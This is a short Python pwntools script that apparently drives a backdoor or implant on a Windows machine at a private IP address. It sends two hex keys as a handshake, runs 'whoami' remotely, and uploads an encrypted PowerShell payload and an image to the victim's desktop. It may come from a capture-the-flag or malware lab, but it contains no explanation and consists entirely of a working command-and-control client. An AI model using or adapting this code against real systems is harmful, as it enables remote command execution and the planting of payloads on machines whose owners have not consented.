
from pwn import *
#context.log_level = 'debug'


key1 = bytes.fromhex("6574212c9b4d9334d893bec2477cb86a70983b3c33952d68a8cc5c0226070abf")
key2 = bytes.fromhex("0e02f4a9a8b5beeaba8348d6d2f87c606849df9a5eef49a65c98cf07d4c238a6")

shell = open('powershell.enc', 'rb').read()
wall  = open('enc_img.bin', 'rb').read()


io = remote("192.168.122.111", 8345)
io.send(key1)
print(io.recv(1024))
io.send(key2)
print(io.recv(1024))
io.send(b'exec whoami\r')
print(io.recv(1024))
io.send(b'upload C:\\Users\\me\\Desktop\\f\\lol\\wallpaper.ps1 708\r')
print(io.recv(1024))
print(io.send(shell))
print(io.recv(1024))

io.send(b'upload C:\\Users\\me\\Desktop\\f\\lol\\desktop.png 122218\r')
print(io.recv(1024))
print(io.send(wall))
print(io.recv(1024))
io.close()
